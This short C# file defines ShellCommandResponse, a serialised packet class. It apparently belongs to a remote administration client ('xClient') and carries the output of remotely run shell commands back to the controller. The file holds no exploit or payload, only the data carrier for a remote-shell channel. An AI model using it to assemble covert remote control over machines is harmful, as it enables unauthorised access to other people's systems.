using ProtoBuf;

namespace xClient.Core.Packets.ClientPackets
{
    [ProtoContract]
    public class ShellCommandResponse : IPacket
    {
        public ShellCommandResponse()
        {
        }

        public ShellCommandResponse(string output)
        {
            Output = output;
        }

        [ProtoMember(1)]
        public string Output { get; set; }

        public void Execute(Client client)
        {
            client.Send<ShellCommandResponse>(this);
        }
    }
}